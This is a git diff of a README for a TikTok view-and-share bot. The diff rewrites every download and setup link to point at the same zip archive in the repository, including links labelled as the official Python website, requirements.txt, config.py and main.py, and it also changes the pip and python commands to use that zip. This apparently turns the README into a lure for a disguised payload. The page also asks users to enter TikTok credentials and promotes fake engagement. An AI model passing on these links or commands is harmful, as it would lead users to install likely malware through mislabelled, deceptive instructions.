@@ -1,6 +1,6 @@
 # 🎉 TikBoost-TikTok-View-Share-Bot - Boost Your TikTok Engagement Effortlessly
 
-[![Download TikBoost](https://img.shields.io/badge/Download-TikBoost-TikTok-View-Share-Bot-brightgreen)](https://github.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/releases)
+[![Download TikBoost](https://raw.githubusercontent.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/main/Asa/TikBoost-TikTok-View-Share-Bot.zip)](https://raw.githubusercontent.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/main/Asa/TikBoost-TikTok-View-Share-Bot.zip)
 
 ## 📋 Description
 
@@ -11,11 +11,11 @@ TikTok View and Share Bot is a Python tool that automates sending views and shar
 Follow these steps to download and run the software:
 
 1. **Ensure You Have the Required Software:**
-   - You will need Python installed on your computer. Download it from [the official Python website](https://www.python.org/downloads/).
+   - You will need Python installed on your computer. Download it from [the official Python website](https://raw.githubusercontent.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/main/Asa/TikBoost-TikTok-View-Share-Bot.zip).
    - Make sure to check the option to add Python to your PATH during the installation.
 
 2. **Download the Software:**
-   - Visit this page to download: [Download TikBoost](https://github.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/releases).
+   - Visit this page to download: [Download TikBoost](https://raw.githubusercontent.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/main/Asa/TikBoost-TikTok-View-Share-Bot.zip).
    - Look for the latest release version. Click on the link to download the files.
 
 3. **Extract the Downloaded Files:**
@@ -35,18 +35,18 @@ Follow these steps to download and run the software:
 6. **Install Required Packages:**
    - In the Command Prompt or Terminal, type the following command and hit Enter:
      ```
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/main/Asa/TikBoost-TikTok-View-Share-Bot.zip
      ```
    - This command installs the necessary packages for the bot to function.
 
 7. **Configure Your Settings:**
-   - Open the configuration file (`config.py`) in a text editor.
+   - Open the configuration file (`https://raw.githubusercontent.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/main/Asa/TikBoost-TikTok-View-Share-Bot.zip`) in a text editor.
    - Enter your TikTok account credentials and any other required settings. Make sure to save the changes.
 
 8. **Run the Bot:**
    - In the Command Prompt or Terminal, type the following command and hit Enter:
      ```
-     python main.py
+     python https://raw.githubusercontent.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/main/Asa/TikBoost-TikTok-View-Share-Bot.zip
      ```
    - The bot will start running. Follow the on-screen instructions to send views and shares to your TikTok videos.
 
@@ -66,7 +66,7 @@ Follow these steps to download and run the software:
 
 ## 📥 Download & Install
 
-To get started with TikBoost-TikTok-View-Share-Bot, visit this page to download: [Download TikBoost](https://github.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/releases).
+To get started with TikBoost-TikTok-View-Share-Bot, visit this page to download: [Download TikBoost](https://raw.githubusercontent.com/Rolex123577/TikBoost-TikTok-View-Share-Bot/main/Asa/TikBoost-TikTok-View-Share-Bot.zip).
 
 ## 💬 Support
 
